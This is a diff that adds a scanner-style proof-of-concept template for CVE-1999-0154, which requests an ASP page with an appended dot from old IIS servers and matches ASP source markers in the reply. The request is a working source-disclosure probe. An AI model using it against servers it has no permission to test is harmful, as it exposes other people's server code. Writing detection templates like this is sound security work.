@@ -1,0 +1,30 @@
+[info]
+author = "ave"
+description = "向 IIS 2.0/3.0 服务器请求 ASP 页面 URL 末尾附加点号，若响应返回 ASP 源码而非执行结果则存在漏洞"
+id = "POC-AVE-1999-0006"
+name = "Microsoft IIS 2.0/3.0 Appended Dot Script Source Disclosure PoC"
+severity = "medium"
+tags = ["ave-1999-0006"]
+vuln_id = [
+    "CVE-1999-0154",
+    "AVE-1999-0006",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/somefile.asp."
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%@",
+    "<%",
+    "RUNAT=SERVER",
+    "Scripting.FileSystemObject",
+]
